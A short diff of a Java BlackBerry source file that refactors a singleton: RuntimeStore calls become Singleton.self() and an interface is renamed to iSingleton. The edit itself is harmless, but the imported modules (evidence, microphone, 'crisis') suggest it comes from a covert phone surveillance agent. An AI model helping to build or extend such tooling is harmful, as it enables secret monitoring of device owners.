@@ -14,12 +14,11 @@ import java.util.Timer;
 
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
-import net.rim.device.api.system.RuntimeStore;
 import blackberry.config.Globals;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
-import blackberry.interfaces.Singleton;
+import blackberry.interfaces.iSingleton;
 import blackberry.module.ModuleCrisis;
 import blackberry.module.ModuleMic;
 import blackberry.utils.BlockingQueueTrigger;
@@ -27,7 +26,7 @@ import blackberry.utils.BlockingQueueTrigger;
 /**
  * The Class Status.
  */
-public final class Status implements Singleton {
+public final class Status implements iSingleton {
 
     /** The debug instance. */
     //#ifdef DEBUG
@@ -59,11 +58,11 @@ public final class Status implements Singleton {
      */
     public static synchronized Status getInstance() {
         if (instance == null) {
-            instance = (Status) RuntimeStore.getRuntimeStore().get(GUID);
+            instance = (Status) Singleton.self().get(GUID);
             if (instance == null) {
                 final Status singleton = new Status();
 
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                Singleton.self().put(GUID, singleton);
                 instance = singleton;
             }
         }
